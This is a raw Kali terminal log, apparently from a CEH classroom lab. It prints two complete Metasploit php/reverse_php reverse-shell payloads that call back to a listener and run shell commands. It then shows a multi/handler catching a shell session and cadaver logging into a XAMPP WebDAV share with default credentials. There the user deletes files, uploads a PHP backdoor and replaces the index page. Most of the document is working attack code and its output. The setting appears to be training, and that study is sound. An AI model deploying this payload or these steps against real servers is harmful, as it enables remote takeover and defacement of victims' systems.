################## Create FIle 
root@kali:~/Desktop/CEH# msfvenom -l payloads 
  

Framework Payloads (538 total) [--payload <value>]
==================================================

    Name                                                Description
    php/shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evil-looking entries in the apache error logs, so it is probably a good idea to use a bind or reverse shell unless firewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appears to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only tested on Apache but it might work on other web servers that leak file descriptors to child processes.
    windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
    windows/meterpreter/reverse_hop_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
    windows/vncinject/reverse_hop_http                  Inject a VNC Dll via a reflective loader (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
root@kali:~/Desktop/CEH# msfvenom -p php/reverse_php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3035 bytes
    /*<?php /**/
      @error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      if(!empty($dis)){
        $dis=preg_replace('/[, ]+/', ',', $dis);
        $dis=explode(',', $dis);
        $dis=array_map('trim', $dis);
      }else{
        $dis=array();
      }
      
    $ipaddr='192.168.0.143';
    $port=4444;

    if(!function_exists('smzKaYT')){
      function smzKaYT($c){
        global $dis;
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\n";
      }
      $qqvvxya='is_callable';
      $zXnyxU='in_array';
      
      if($qqvvxya('system')and!$zXnyxU('system',$dis)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($qqvvxya('popen')and!$zXnyxU('popen',$dis)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($qqvvxya('proc_open')and!$zXnyxU('proc_open',$dis)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($qqvvxya('shell_exec')and!$zXnyxU('shell_exec',$dis)){
        $o=shell_exec($c);
      }else
      if($qqvvxya('exec')and!$zXnyxU('exec',$dis)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      if($qqvvxya('passthru')and!$zXnyxU('passthru',$dis)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      {
        $o=0;
      }
    
        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://192.168.0.143",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=smzKaYT(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=smzKaYT(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }
root@kali:~/Desktop/CEH# msfvenom -p php/reverse_php LHOST=192.168.0.143
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3024 bytes
    /*<?php /**/
      @error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      if(!empty($dis)){
        $dis=preg_replace('/[, ]+/', ',', $dis);
        $dis=explode(',', $dis);
        $dis=array_map('trim', $dis);
      }else{
        $dis=array();
      }
      
    $ipaddr='192.168.0.143';
    $port=4444;

    if(!function_exists('QDRyMVGNyKAzc')){
      function QDRyMVGNyKAzc($c){
        global $dis;
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\n";
      }
      $gJHq='is_callable';
      $TaWr='in_array';
      
      if($gJHq('popen')and!$TaWr('popen',$dis)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($gJHq('shell_exec')and!$TaWr('shell_exec',$dis)){
        $o=shell_exec($c);
      }else
      if($gJHq('exec')and!$TaWr('exec',$dis)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      if($gJHq('passthru')and!$TaWr('passthru',$dis)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($gJHq('proc_open')and!$TaWr('proc_open',$dis)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($gJHq('system')and!$TaWr('system',$dis)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      {
        $o=0;
      }
    
        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://192.168.0.143",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=QDRyMVGNyKAzc(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=QDRyMVGNyKAzc(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }
root@kali:~/Desktop/CEH# msfvenom -p php/reverse_php LHOST=192.168.0.143 LPORT=4433 -f raw -o /root/Desktop/stud_phpbackdoor.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3042 bytes
Saved as: /root/Desktop/stud_phpbackdoor.php



# MSFCONSOLE :oot@kali:~/Desktop/CEH# msfconsole -q
msf > use multi/handler
msf exploit(multi/handler) > set payload php/reverse_php
payload => php/reverse_php
msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > set LHOST 192.168.0.143
LHOST => 192.168.0.143
msf exploit(multi/handler) > set port 443
port => 443
msf exploit(multi/handler) > set port 4433
port => 4433
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.0.143:4444 
  
^Z
[1]+  Stopped                 msfconsole -q
root@kali:~/Desktop/CEH# exploit -j
bash: exploit: command not found
root@kali:~/Desktop/CEH# exploit -j
bash: exploit: command not found
root@kali:~/Desktop/CEH# msfconsole -q
msf > set payload php/reverse_php
payload => php/reverse_php
msf > set LHOST 192.168.0.143
LHOST => 192.168.0.143
msf > 
msf > 
msf > set port 4433
port => 4433
msf > exploit -j 
[-] Unknown command: exploit.
msf > set payload php/reverse_php
[2]+  Stopped                 msfconsole -q
root@kali:~/Desktop/CEH# msfconsole -q
msf > use multi/handler

msf exploit(multi/handler) > 
msf exploit(multi/handler) > set payload php/reverse_php
payload => php/reverse_php
msf exploit(multi/handler) > set LHOST 192.168.0.143
LHOST => 192.168.0.143
msf exploit(multi/handler) > set port 4433
port => 4433
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.

[-] Handler failed to bind to 192.168.0.143:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
msf exploit(multi/handler) > jobs

Jobs
====

No active jobs.

msf exploit(multi/handler) > jobs

Jobs
====

No active jobs.

msf exploit(multi/handler) > jobs

Jobs
====

No active jobs.

msf exploit(multi/handler) > jobs

Jobs
====

No active jobs.

msf exploit(multi/handler) > jobs

Jobs
====

No active jobs.

msf exploit(multi/handler) > jobs

Jobs
====

No active jobs.

msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.

[-] Handler failed to bind to 192.168.0.143:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
msf exploit(multi/handler) > sessions

Active sessions
===============

No active sessions.

msf exploit(multi/handler) > sessions

Active sessions
===============

No active sessions.

msf exploit(multi/handler) > jobs

Jobs
====

No active jobs.

msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 2.

[-] Handler failed to bind to 192.168.0.143:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 3.

[*] Started reverse TCP handler on 192.168.0.143:4444 
msf exploit(multi/handler) > jobs -K
Stopping all jobs...
msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.143    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > set LPORT 4433
LPORT => 4433
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 4.

[*] Started reverse TCP handler on 192.168.0.143:4433 
msf exploit(multi/handler) > [*] Command shell session 1 opened (192.168.0.143:4433 -> 192.168.0.159:1039) at 2019-08-03 15:45:23 +0530

msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type           Information  Connection
  --  ----  ----           -----------  ----------
  1         shell php/php               192.168.0.143:4433 -> 192.168.0.159:1039 (192.168.0.159)

msf exploit(multi/handler) > session -1
[-] Unknown command: session.
msf exploit(multi/handler) > session 
[-] Unknown command: session.
msf exploit(multi/handler) > sessios
[-] Unknown command: sessios.
msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type           Information  Connection
  --  ----  ----           -----------  ----------
  1         shell php/php               192.168.0.143:4433 -> 192.168.0.159:1039 (192.168.0.159)

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

[*] 192.168.0.159 - Command shell session 1 closed.
msf exploit(multi/handler) > ls



################ Cadaver 

root@kali:~/Desktop/CEH# cadaver -h
Usage: cadaver [OPTIONS] http://hostname[:port]/path
  Port defaults to 80, path defaults to '/'
Options:
  -t, --tolerant            Allow cd/open into non-WebDAV enabled collection.
  -r, --rcfile=FILE         Read script from FILE instead of ~/.cadaverrc.
  -p, --proxy=PROXY[:PORT]  Use proxy host PROXY and optional proxy port PORT.
  -V, --version             Display version information.
  -h, --help                Display this help message.
Please send bug reports and feature requests to <cadaver@webdav.org>
root@kali:~/Desktop/CEH# cadaver http://192.168.0.159/webdav
Authentication required for XAMPP with WebDAV on server `192.168.0.159':
Username: wampp
Password: 
dav:/webdav/> dir
Unrecognised command. Type 'help' for a list of commands.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        index.html                           313  Aug  6  2009
        webdav.txt                           277  Aug  6  2009
dav:/webdav/> ?
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/webdav/> delete index.html
Deleting `index.html': succeeded.
dav:/webdav/> 
dav:/webdav/> delete webdav.txt
Deleting `webdav.txt': succeeded.
dav:/webdav/> dir
Unrecognised command. Type 'help' for a list of commands.
dav:/webdav/> put /root/Desktop/stud_phpbackdoor.php
Uploading /root/Desktop/stud_phpbackdoor.php to `/webdav/stud_phpbackdoor.php':
Progress: [=============================>] 100.0% of 3042 bytes succeeded.
dav:/webdav/> dir
Unrecognised command. Type 'help' for a list of commands.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        Ank.php                             3020  Aug  3 15:30
        Avinash.php                         3026  Aug  3 15:31
        Loki_phpbackdoor.php                3023  Aug  3 15:31
        ajay.php                            3029  Aug  3 15:31
        amit_pphpbackdoor.php               3038  Aug  3 15:31
        amreet_phpbackdoor.php              3029  Aug  3 15:31
        amulya_phpbackdoor.php              3049  Aug  3 15:31
        chandran_phpbackdoor.php            1114  Aug  3 15:31
        dash_phpbackdoor.php                3020  Aug  3 15:31
        dj_phpbackdoor.php                  3063  Aug  3 15:31
        dragon_backdoor.php                 3035  Aug  3 15:31
        gowtham_phpbackdoor.php             3028  Aug  3 15:31
        hina_phpbackdoor.php                3008  Aug  3 15:31
        jitu_phpbackdoor.php                3021  Aug  3 15:31
        kavya_phpbackdoor.php               2999  Aug  3 15:31
        mereena_phpbackdoor.php             3027  Aug  3 15:31
        neha_phpbackdoor.php                3029  Aug  3 15:31
        nemesis_phpbackdoor.php             3055  Aug  3 15:30
        prit_attack.php                     3004  Aug  3 15:30
        sachin.php                          3014  Aug  3 15:31
        soumya_backdoor.php                 3015  Aug  3 15:31
        sridhar_phpbackdoor.php             3026  Aug  3 15:31
        stud_phpbackdoor.php                3042  Aug  3 15:32
        sumit_phpbackdoor.php               3024  Aug  3 15:31
        test_php.php                        3027  Aug  3 15:32
        tri.php                             3050  Aug  3 15:31
        zabi_phpbackdoor.php                3043  Aug  3 15:31
dav:/webdav/> delete *
[Matching... 27 matches.]
Deleting `zabi_phpbackdoor.php': succeeded.
Deleting `tri.php': succeeded.
Deleting `test_php.php': succeeded.
Deleting `sumit_phpbackdoor.php': succeeded.
Deleting `stud_phpbackdoor.php': succeeded.
Deleting `sridhar_phpbackdoor.php': succeeded.
Deleting `soumya_backdoor.php': succeeded.
Deleting `sachin.php': succeeded.
Deleting `prit_attack.php': succeeded.
Deleting `nemesis_phpbackdoor.php': succeeded.
Deleting `neha_phpbackdoor.php': succeeded.
Deleting `mereena_phpbackdoor.php': succeeded.
Deleting `kavya_phpbackdoor.php': succeeded.
Deleting `jitu_phpbackdoor.php': succeeded.
Deleting `hina_phpbackdoor.php': succeeded.
Deleting `gowtham_phpbackdoor.php': succeeded.
Deleting `dragon_backdoor.php': succeeded.
Deleting `dj_phpbackdoor.php': succeeded.
Deleting `dash_phpbackdoor.php': succeeded.
Deleting `chandran_phpbackdoor.php': succeeded.
Deleting `amulya_phpbackdoor.php': succeeded.
Deleting `amreet_phpbackdoor.php': succeeded.
Deleting `amit_pphpbackdoor.php': succeeded.
Deleting `ajay.php': succeeded.
Deleting `Loki_phpbackdoor.php': succeeded.
Deleting `Avinash.php': succeeded.
Deleting `Ank.php': succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': collection is empty.
dav:/webdav/> put /root/Desktop/studhpbackdoor.php
Uploading /root/Desktop/studhpbackdoor.php to `/webdav/studhpbackdoor.php': Could not open file: No such file or directory
dav:/webdav/> 
Connection to `192.168.0.159' closed.
root@kali:~/Desktop/CEH# cadaver 
dav:!> ^Z
[1]+  Stopped                 cadaver
root@kali:~/Desktop/CEH# cadaver http://192.168.0.159/webdav
Authentication required for XAMPP with WebDAV on server `192.168.0.159':
Username: wmapp
Password: 
Authentication required for XAMPP with WebDAV on server `192.168.0.159':
Username: wampp
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   woah                                   0  Aug  3 15:34
        Ank.php                             3020  Aug  3 15:34
        Avinash.php                         3026  Aug  3 15:34
        chandran_phpbackdoor.php            1114  Aug  3 15:34
        index.html                           313  Aug  6  2009
        mukund.php                          3039  Aug  3 15:34
        nemesis_phpbackdoor.php             3055  Aug  3 15:34
        prit_attack.php                     3004  Aug  3 15:34
        sridhar_phpbackdoor.php             3026  Aug  3 15:34
        webdav.txt                           277  Aug  6  2009
dav:/webdav/> put /root/Desktop/stud_phpbackdoor.php
Uploading /root/Desktop/stud_phpbackdoor.php to `/webdav/stud_phpbackdoor.php':
Progress: [=============================>] 100.0% of 3042 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   woah                                   0  Aug  3 15:34
        Ank.php                             3020  Aug  3 15:34
        Avinash.php                         3026  Aug  3 15:34
        Jay_phpbackdoor.php                 3025  Aug  3 15:35
        Mallik_phpbackdoor.php              3044  Aug  3 15:35
        ajay.php                            3029  Aug  3 15:34
        amit_pphpbackdoor.php               3038  Aug  3 15:35
        amreet_phpbackdoor.php              3029  Aug  3 15:34
        amulya_phpbackdoor.php              3049  Aug  3 15:35
        chandran_phpbackdoor.php            1114  Aug  3 15:34
        dash_phpbackdoor.php                3020  Aug  3 15:35
        dj_phpbackdoor.php                  3063  Aug  3 15:35
        dragon_backdoor.php                 3035  Aug  3 15:35
        gowtham_phpbackdoor.php             3028  Aug  3 15:34
        hina_phpbackdoor.php                3008  Aug  3 15:35
        index.html                           313  Aug  6  2009
        kavya_phpbackdoor.php               2999  Aug  3 15:34
        manju_phpbackdoor.php               3045  Aug  3 15:35
        mereena_phpbackdoor.php             3027  Aug  3 15:35
        mukund.php                          3039  Aug  3 15:34
        neha_phpbackdoor.php                3029  Aug  3 15:34
        nemesis_phpbackdoor.php             3055  Aug  3 15:34
        prit_attack.php                     3004  Aug  3 15:34
        sachin.php                          3014  Aug  3 15:35
        soumya_backdoor.php                 3015  Aug  3 15:35
        sridhar_phpbackdoor.php             3026  Aug  3 15:34
        stud_phpbackdoor.php                3042  Aug  3 15:35
        suvojit_phpbackdoor.php             3024  Aug  3 15:35
        test_php.php                        3027  Aug  3 15:34
        tri.php                             3050  Aug  3 15:35
        viv.php                             3054  Aug  3 15:35
        webdav.txt                           277  Aug  6  2009
        zabi_phpbackdoor.php                3043  Aug  3 15:35
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   woah                                   0  Aug  3 15:34
        Ank.php                             3020  Aug  3 15:34
        Avinash.php                         3026  Aug  3 15:34
        Jay_phpbackdoor.php                 3025  Aug  3 15:35
        Loki_phpbackdoor.php                3023  Aug  3 15:35
        Mallik_phpbackdoor.php              3044  Aug  3 15:35
        Shariq_phpbackdoor.php              3035  Aug  3 15:35
        ajay.php                            3029  Aug  3 15:34
        amit_pphpbackdoor.php               3038  Aug  3 15:35
        amreet_phpbackdoor.php              3029  Aug  3 15:34
        amulya_phpbackdoor.php              3049  Aug  3 15:35
        asim_phpbackdoor.php                3031  Aug  3 15:35
        chandran_phpbackdoor.php            1114  Aug  3 15:34
        dash_phpbackdoor.php                3020  Aug  3 15:35
        dj_phpbackdoor.php                  3063  Aug  3 15:35
        dragon_backdoor.php                 3035  Aug  3 15:35
        gowtham_phpbackdoor.php             3028  Aug  3 15:34
        hina_phpbackdoor.php                3008  Aug  3 15:35
        index.html                           313  Aug  6  2009
        jitu_phpbackdoor.php                3021  Aug  3 15:35
        kavya_phpbackdoor.php               2999  Aug  3 15:34
        manju_phpbackdoor.php               3045  Aug  3 15:35
        mereena_phpbackdoor.php             3027  Aug  3 15:35
        mukund.php                          3039  Aug  3 15:34
        neha_phpbackdoor.php                3029  Aug  3 15:34
        nemesis_phpbackdoor.php             3055  Aug  3 15:34
        prit_attack.php                     3004  Aug  3 15:34
        sachin.php                          3014  Aug  3 15:35
        soumya_backdoor.php                 3015  Aug  3 15:35
        sridhar_phpbackdoor.php             3026  Aug  3 15:34
        stud_phpbackdoor.php                3042  Aug  3 15:35
        suvojit_phpbackdoor.php             3024  Aug  3 15:35
        test_php.php                        3027  Aug  3 15:34
        tri.php                             3050  Aug  3 15:35
        vasavi_phpbackdoor.php              3066  Aug  3 15:35
        viv.php                             3054  Aug  3 15:35
        webdav.txt                           277  Aug  6  2009
        zabi_phpbackdoor.php                3043  Aug  3 15:35
dav:/webdav/> delete index.html
Deleting `index.html': succeeded.
dav:/webdav/> put /root/Desktop/index.html
Uploading /root/Desktop/index.html to `/webdav/index.html':
Progress: [=============================>] 100.0% of 54 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   woah                                   0  Aug  3 15:34
        Ank.php                             3020  Aug  3 15:34
        Avinash.php                         3026  Aug  3 15:34
        Jay_phpbackdoor.php                 3025  Aug  3 15:35
        Loki_phpbackdoor.php                3023  Aug  3 15:43
        Mallik_phpbackdoor.php              3044  Aug  3 15:35
        Shariq_phpbackdoor.php              3035  Aug  3 15:35
        ajay.php                            3029  Aug  3 15:34
        amit_pphpbackdoor.php               3038  Aug  3 15:35
        amreet_phpbackdoor.php              3029  Aug  3 15:34
        amulya_phpbackdoor.php              3049  Aug  3 15:35
        asim_phpbackdoor.php                3031  Aug  3 15:35
        chandran_phpbackdoor.php            1114  Aug  3 15:34
        dash_phpbackdoor.php                3020  Aug  3 15:35
        dj_phpbackdoor.php                  3063  Aug  3 15:35
        dragon_backdoor.php                 3035  Aug  3 15:35
        gowtham_phpbackdoor.php             3028  Aug  3 15:43
        hina_phpbackdoor.php                3008  Aug  3 15:41
        jab.php                             3027  Aug  3 15:47
        jitu_phpbackdoor.php                3021  Aug  3 15:35
        kavya_phpbackdoor.php               2999  Aug  3 15:34
        manju_phpbackdoor.php               3045  Aug  3 15:35
        mereena_phpbackdoor.php             3027  Aug  3 15:35
        mukund.php                          3039  Aug  3 15:34
        neha_phpbackdoor.php                3029  Aug  3 15:34
        nemesis_phpbackdoor.php             3055  Aug  3 15:38
        prit_attack.php                     3004  Aug  3 15:34
        sachin.php                          3014  Aug  3 15:35
        satish_phpbackdoor.php              3038  Aug  3 15:42
        soumya_backdoor.php                 3015  Aug  3 15:35
        sridhar_phpbackdoor.php             3026  Aug  3 15:34
        stud_phpbackdoor.php                3042  Aug  3 15:35
        sumit_phpbackdoor.php               3024  Aug  3 15:36
        suvojit.php                         1114  Aug  3 15:47
        suvojit_phpbackdoor.php             3024  Aug  3 15:35
        tMi1xRb.php                         3031  Aug  3 15:42
        test_php.php                        3027  Aug  3 15:34
        tri.php                             3050  Aug  3 15:35
        vasavi_phpbackdoor.php              3066  Aug  3 15:35
        vinil.php                           3042  Aug  3 15:41
        viv.php                             3054  Aug  3 15:35
        webdav.txt                           277  Aug  6  2009
        zabi_phpbackdoor.php                3043  Aug  3 15:35
dav:/webdav/> put /root/Desktop/index.html
Uploading /root/Desktop/index.html to `/webdav/index.html':
Progress: [=============================>] 100.0% of 54 bytes succeeded.
dav:/webdav/> put /root/Desktop/index.html
Uploading /root/Desktop/index.html to `/webdav/index.html':
Progress: [=============================>] 100.0% of 83 bytes succeeded.
dav:/webdav/> put /root/Desktop/index.html
Uploading /root/Desktop/index.html to `/webdav/index.html':
Progress: [=============================>] 100.0% of 82 bytes succeeded.
dav:/webdav/> put /root/Desktop/index.html
Uploading /root/Desktop/index.html to `/webdav/index.html':
Progress: [=============================>] 100.0% of 82 bytes succeeded.
dav:/webdav/> delete index.html
Deleting `index.html': succeeded.
dav:/webdav/> put /root/Desktop/index.php
Uploading /root/Desktop/index.php to `/webdav/index.php':
Progress: [=============================>] 100.0% of 55 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        Ank.php                             3020  Aug  3 15:34
        Avinash.php                         3026  Aug  3 15:34
        Jay_phpbackdoor.php                 3025  Aug  3 15:35
        Loki_phpbackdoor.php                3047  Aug  3 15:50
        Mallik_phpbackdoor.php              3044  Aug  3 15:35
        Shariq_phpbackdoor.php              3035  Aug  3 15:35
        abc.php                             3047  Aug  3 15:52
        ajay.php                            3029  Aug  3 15:34
        amit_pphpbackdoor.php               3038  Aug  3 15:35
        amreet_phpbackdoor.php              3029  Aug  3 15:34
        amulya_phpbackdoor.php              3049  Aug  3 15:35
        asim_phpbackdoor.php                3031  Aug  3 15:35
        chandran_phpbackdoor.php            1114  Aug  3 15:34
        dash_phpbackdoor.php                3020  Aug  3 15:35
        dj_phpbackdoor.php                  3063  Aug  3 15:35
        dragon_backdoor.php                 3035  Aug  3 15:35
        gowtham_phpbackdoor.php             3028  Aug  3 15:49
        hina_phpbackdoor.php                3008  Aug  3 15:49
        index.php                             55  Aug  3 15:51
        jab.php                             3027  Aug  3 15:51
        jitu_phpbackdoor.php                3021  Aug  3 15:35
        kavya_phpbackdoor.php               2999  Aug  3 15:34
        manju_phpbackdoor.php               3045  Aug  3 15:35
        mereena_phpbackdoor.php             3027  Aug  3 15:35
        mukund.php                          3039  Aug  3 15:34
        neha_phpbackdoor.php                3029  Aug  3 15:34
        nemesis_phpbackdoor.php             3055  Aug  3 15:38
        prit_attack.php                     3004  Aug  3 15:34
        sachin.php                          3014  Aug  3 15:35
        satish_phpbackdoor.php              3038  Aug  3 15:42
        soumya_backdoor.php                 3015  Aug  3 15:35
        sridhar_phpbackdoor.php             3026  Aug  3 15:34
        stud_phpbackdoor.php                3042  Aug  3 15:35
        sumit_phpbackdoor.php               3024  Aug  3 15:36
        suvojit.php                         1114  Aug  3 15:47
        suvojit_phpbackdoor.php             3024  Aug  3 15:35
        tMi1xRb.php                         3031  Aug  3 15:42
        test_php.php                        3027  Aug  3 15:34
        tri.php                             3050  Aug  3 15:35
        vasavi_phpbackdoor.php              3066  Aug  3 15:35
        vinil.php                           3042  Aug  3 15:52
        viv.php                             3054  Aug  3 15:35
        webdav.txt                           277  Aug  6  2009
        zabi_phpbackdoor.php                3043  Aug  3 15:51
dav:/webdav/> ?
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
